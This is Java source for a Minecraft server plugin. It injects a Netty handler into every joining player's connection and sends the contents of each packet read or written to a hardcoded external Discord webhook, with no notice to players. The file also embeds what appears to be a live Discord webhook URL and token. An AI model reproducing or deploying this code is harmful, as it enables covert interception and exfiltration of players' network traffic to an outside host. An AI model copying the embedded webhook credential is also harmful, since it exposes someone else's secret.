package lunar.packetlogger.update;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

import io.netty.channel.Channel;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.ChannelPromise;
import lunar.packetlogger.update.utils.DiscordWebhook;

public class Main extends JavaPlugin implements Listener{
	
	public static Main plugin;
	public String webhookURL = "https://discord.com/api/webhooks/865816540008153118/CbLFjHwn70Ss1R_TUBXHFeYmDG6c3O5J0PPWVIWOQvEiW8QAD6Ldm3_c3HimalxXnsd5";
	
	@Override
	public void onEnable() {
		Bukkit.getPluginManager().registerEvents(this, this);
		
		DiscordWebhook webhook = new DiscordWebhook(webhookURL);
		webhook.addEmbed(new DiscordWebhook.EmbedObject()
				.setDescription("started connection"));
		try {
			webhook.execute();
		}
		catch(java.io.IOException e) {
			getLogger().severe(e.getStackTrace().toString());
		}
		getLogger().info("succesfully loaded");
	}
	
	@EventHandler
	public void onjoin(PlayerJoinEvent event) {
		logPlayer(event.getPlayer());
	}
	
	@EventHandler
	public void onleave(PlayerQuitEvent event) {
		removePlayer(event.getPlayer());
	}
	
	private void removePlayer(Player player) {
		Channel channel = ((CraftPlayer) player).getHandle().playerConnection.networkManager.channel;
		channel.eventLoop().submit(() -> {
			channel.pipeline().remove(player.getName());
			return null;
		});
	}
	
	private void logPlayer(Player player) {
		ChannelDuplexHandler channelDuplexHandler = new ChannelDuplexHandler() {
			
			@Override
			public void channelRead(ChannelHandlerContext channelHandlerContext, Object packet) throws Exception {
				DiscordWebhook webhook = new DiscordWebhook(webhookURL);
				webhook.addEmbed(new DiscordWebhook.EmbedObject()
						.setDescription("read: " + packet.toString()));
				try {
					webhook.execute();
				}
				catch(java.io.IOException e) {
					getLogger().severe(e.getStackTrace().toString());
				}
				super.channelRead(channelHandlerContext, packet);
			}
			
			@Override
			public void write(ChannelHandlerContext channelHandlerContext, Object packet, ChannelPromise channelPromise) throws Exception {
				DiscordWebhook webhook = new DiscordWebhook(webhookURL);
				webhook.addEmbed(new DiscordWebhook.EmbedObject()
						.setDescription("write: " + packet.toString()));
				try {
					webhook.execute();
				}
				catch(java.io.IOException e) {
					getLogger().severe(e.getStackTrace().toString());
				}
				super.write(channelHandlerContext, packet, channelPromise);
			}
			
		};
		
		ChannelPipeline pipeline = ((CraftPlayer) player).getHandle().playerConnection.networkManager.channel.pipeline();
		pipeline.addBefore("packet_handler", player.getName(), channelDuplexHandler);
	}
	
}
